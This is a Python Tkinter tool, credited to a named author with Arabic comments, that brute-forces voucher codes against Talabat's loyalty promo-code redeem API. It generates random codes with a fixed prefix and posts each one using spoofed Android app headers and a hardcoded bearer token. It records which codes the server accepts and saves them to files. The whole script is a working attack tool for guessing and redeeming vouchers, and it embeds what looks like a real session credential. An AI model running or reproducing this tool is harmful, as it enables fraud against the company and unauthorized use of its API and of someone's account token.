import requests
import random
import string
import time
import tkinter as tk
from threading import Thread, Event
import socket  # استيراد مكتبة socket للحصول على عنوان IP
from tkinter import messagebox
print('''
[!] Update Date 9/10/2024 6.45 PM
[!] Gui Talabat By Ghalwash @Mrfa0gh
[!] Realised 08/10/2024 5:05 PM
[!] All copyrights to Ghalwash @Mrfa0gh
''')

# إعداد البيانات
url = "https://loyalty.talabat.com/api/v3/me/promo-codes/redeem"
headers = {
    'Host': 'loyalty.talabat.com',
    'newrelic': '{"v":[0,2],"d":{"d.ty":"Mobile","d.ac":"","d.ap":"","d.tr":"7f94ebd9261a477fa4167ffc09cc244f","d.id":"3517f8e70c404d23","d.ti":1728330743117}}',
    'tracestate': '@nr=0-2---3517f8e70c404d23----1728330743117',
    'traceparent': '00-7f94ebd9261a477fa4167ffc09cc244f-3517f8e70c404d23-00',
    'accept-language': 'en-US',
    'x-device-source': '6',
    'brandtype': '1',
    'appbrand': '1',
    'x-perseussessionid': '1728330608749.1370958624.sjnubreaif',
    'x-perseusclientid': '1728330609067.5137469820.haspqlgrjm',
    'x-device-version': '9.74',
    'x-device-id': '6aa217de63c433f0',
    'authorization': 'bearer y31y0_PsnRvOgJoX7hIbgljCEMTZc2clixIo_css-rm2Bz4JHOXC7YCeooiqdfgWVCqE8VSF6SllDxyRT-2RoK-VDhdXYHx-bS41dZyBEXdSYsJ-HLHOd9CiRhEQDzQPnork_TMwORlJrbBkh-B0TZ81ItiCDE4b3435T8LOSOyDr2T38TmCsRmNAGsDCONyL28D8j2Ioil0mm14M0K2Saeg8LGNfwKt4gjcC25HjKfg55esMEy4qOlLPVKGthKwleGpZXkygdS-Ik6BN46dkcnhYlTPe3QzWJPyo8f45btQdM3BHg1fsLRnXD1oNzIoC3sC31TUDoYgkMEJx_q2tIaaB53x86bp50SmkfcPDxe6uSURMC5Gldc7CwOZcm3H09cBLiR5QWcqHDz3TImMsIuMwbFiVYvAEIe1Y4ENZRhsQGOxna_ufUYz5e7FmvhHRIs_eJxH94US4IAQJSHu_CZ3q6GrvD7ULobAFHHp_vlqA0XQlVJhE0RBmft0pHD7qD2xWoRdQr7reKGtM_mVNrpWUfo12sXz9VXPNvRKVIG_ti0ijlSv4Sl6y73pOcqNw6um97KOglyxYZ6lWzT_cQ8KI_IRts3yfx9_Ki6CWwSR7TS9T2bVNbIEf6qR21CZdtZ5FP_NC9XwzLji26Du3nagCFY',
    'x-talabat-android-installation-path': 'L2RhdGEvdXNlci8wL2NvbS50YWxhYmF0',
    'x-talabat-android-package-name': 'com.talabat',
    'content-type': 'application/json; charset=UTF-8',
    'accept-encoding': 'gzip',
    'user-agent': 'okhttp/4.9.2'
}


class PromoCodeChecker:
    def __init__(self):
        self.stop_event = Event()
        self.pause_event = Event()
        self.valid_count = 0
        self.invalid_count = 0
        self.error_count = 0
        self.valid_codes = []
        self.invalid_codes = []
        self.error_codes = []

    def generate_codes(self, base_code, total_length):
        suffix_length = total_length - len(base_code)
        characters = string.ascii_letters + string.digits
        while not self.stop_event.is_set():
            suffix = ''.join(random.choice(characters) for _ in range(suffix_length))
            yield base_code + suffix

    def check_codes(self, num_codes, wait_time):
        code_generator = self.generate_codes("5T7", 10)
        with open("response.txt", "w") as response_file:  # فتح ملف لتخزين الريسبونس
            for _ in range(num_codes):
                if self.stop_event.is_set():
                    break
                while self.pause_event.is_set():
                    time.sleep(0.1)  # انتظار حتى يتم استئناف التنفيذ

                code = next(code_generator)

                data = {
                    "promoCode": code,
                    "country": 9
                }

                try:
                    response = requests.post(url, headers=headers, json=data)

                    # كتابة الريسبونس في الملف
                    response_file.write(f"Code: {code}, Response: {response.text}\n")

                    if response.status_code == 400 and response.json().get('errors') == ['This voucher code is invalid, please enter a valid code.']:
                        self.invalid_count += 1
                        self.invalid_codes.append(code)
                        status_code_text.config(state=tk.NORMAL)
                        status_code_text.delete(1.0, tk.END)
                        status_code_text.insert(tk.END, f"[!] Voucher {code} is Invalid {response.text[19:59]}")
                        status_code_text.config(state=tk.DISABLED)
                        
                        # إضافة الكود غير الصالح إلى مربع النص الخاص بالأكواد غير الصالحة
                        invalid_codes_text.config(state=tk.NORMAL)
                        invalid_codes_text.insert(tk.END, f"{code}\n")
                        invalid_codes_text.config(state=tk.DISABLED)

                    else:
                        self.valid_count += 1
                        self.valid_codes.append(code)
                        status_code_text.config(state=tk.NORMAL)
                        status_code_text.delete(1.0, tk.END)
                        status_code_text.insert(tk.END, f"[+] Voucher {code} is Valid {response.text}")
                        status_code_text.config(state=tk.DISABLED)

                except Exception as e:
                    self.error_count += 1
                    self.error_codes.append(code)
                    status_code_text.config(state=tk.NORMAL)
                    status_code_text.delete(1.0, tk.END)
                    status_code_text.insert(tk.END, f"[!] Error processing {code}: {str(e)}")
                    status_code_text.config(state=tk.DISABLED)

                # تحديث الأرقام في الشاشة
                update_counts()

                time.sleep(wait_time)

        # بعد انتهاء العملية أو إيقافها
        self.save_results()
        show_completion_message(self)

    def save_results(self):
        # حفظ الأكواد الصالحة
        with open("valid.txt", "w") as valid_file:
            valid_file.write("\n".join(self.valid_codes))

        # حفظ الأكواد غير الصالحة
        with open("invalid.txt", "w") as invalid_file:
            invalid_file.write("\n".join(self.invalid_codes))

        # حفظ الأكواد التي حدثت بها أخطاء
        with open("error.txt", "w") as error_file:
            error_file.write("\n".join(self.error_codes))


def show_completion_message(self):
    messagebox.showinfo("Check Complete", 
                        f"Check finished!\nValid: {self.valid_count}\nInvalid: {self.invalid_count}\nError: {self.error_count}\nResults saved in files.")


def update_counts():
    invalid_label.config(text=f"Invalid: {promo_checker.invalid_count}")
    valid_label.config(text=f"Valid: {promo_checker.valid_count}")
    error_label.config(text=f"Error: {promo_checker.error_count}")


def start_checking():
    try:
        num_codes = int(num_codes_entry.get())
        wait_time = float(wait_time_entry.get())
        promo_checker.valid_count = 0
        promo_checker.invalid_count = 0
        promo_checker.error_count = 0
        update_counts()
        promo_checker.stop_event.clear()
        promo_checker.pause_event.clear()
        thread = Thread(target=promo_checker.check_codes, args=(num_codes, wait_time))
        thread.start()
    except ValueError:
        error_label.config(text="Please enter valid numbers!")


def pause_checking():
    if promo_checker.pause_event.is_set():
        promo_checker.pause_event.clear()
        pause_button.config(text="Pause")
    else:
        promo_checker.pause_event.set()
        pause_button.config(text="Resume")


def stop_checking():
    promo_checker.stop_event.set()
    promo_checker.pause_event.clear()  # التأكد من إيقاف أي توقف مؤقت


# إعداد واجهة المستخدم
root = tk.Tk()
root.title("Coded By Ghalwash")
root.geometry("360x480")  # ضبط حجم النافذة إلى 360x480

# إدخال عدد الرموز ووقت الانتظار
tk.Label(root, text="Number of Codes:").pack(pady=5)
num_codes_entry = tk.Entry(root)
num_codes_entry.pack(pady=5)

tk.Label(root, text="Time per Request (seconds):").pack(pady=5)
wait_time_entry = tk.Entry(root)
wait_time_entry.pack(pady=5)

# إضافة حقل لعرض IP
def get_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json()['ip']
    except Exception as e:
        return "Unable to get IP"

ip_label = tk.Label(root, text=f"IP: {get_ip()}")
ip_label.pack(pady=5)

'''def update_ip():
    ip = get_ip()
    ip_label.config(text=f"IP: {ip}")
    root.after(10000, update_ip)  # every 10 sec

# استدعاء تحديث IP عند بدء التطبيق
update_ip()
'''
# أزرار البدء والإيقاف والتوقف المؤقت
button_frame = tk.Frame(root)
button_frame.pack(pady=5)

start_button = tk.Button(button_frame, text="Start", command=start_checking, bg="green", fg="white", width=10)
start_button.pack(side=tk.LEFT, padx=5)

pause_button = tk.Button(button_frame, text="Pause", command=pause_checking, bg="orange", fg="white", width=10)
pause_button.pack(side=tk.LEFT, padx=5)

stop_button = tk.Button(button_frame, text="Stop", command=stop_checking, bg="red", fg="white", width=10)
stop_button.pack(side=tk.LEFT, padx=5)

name_label = tk.Label(root, text="talabat Voucher Checker By Ghalwash @Mrfa0gh")
name_label.pack(pady=5)

# تسميات العد
stats_frame = tk.Frame(root)
stats_frame.pack(pady=5)

valid_label = tk.Label(stats_frame, text="Valid: 0")
valid_label.pack(side=tk.LEFT, padx=5)

invalid_label = tk.Label(stats_frame, text="Invalid: 0")
invalid_label.pack(side=tk.LEFT, padx=5)

error_label = tk.Label(stats_frame, text="Error: 0")
error_label.pack(side=tk.LEFT, padx=5)

# مربع النص لحالة الرمز
tk.Label(root, text="Status Code:").pack(pady=5)
status_code_text = tk.Text(root, height=2, width=45, bg="#f0f0f0", fg="black", state=tk.DISABLED)
status_code_text.pack(pady=5)

# مربعات العرض
codes_frame = tk.Frame(root)
codes_frame.pack(pady=5)

# إضافة تسمية لمربع الأكواد غير الصالحة
invalid_label_text = tk.Label(codes_frame, text="Invalid Codes:")
invalid_label_text.grid(row=0, column=0, padx=5)

# مربع الأكواد غير الصالحة
invalid_codes_text = tk.Text(codes_frame, height=10, width=20, bg="#f0f0f0", fg="black", state=tk.DISABLED)
invalid_codes_text.grid(row=1, column=0, padx=5)

# إضافة تسمية لمربع الأكواد الصالحة
valid_label_text = tk.Label(codes_frame, text="Valid Codes:")
valid_label_text.grid(row=0, column=1, padx=5)

# مربع الأكواد الصالحة
valid_codes_text = tk.Text(codes_frame, height=10, width=20, bg="#f0f0f0", fg="black", state=tk.DISABLED)
valid_codes_text.grid(row=1, column=1, padx=5)

# إنشاء كائن لفحص رموز الترويج
promo_checker = PromoCodeChecker()

# تشغيل التطبيق
root.mainloop()
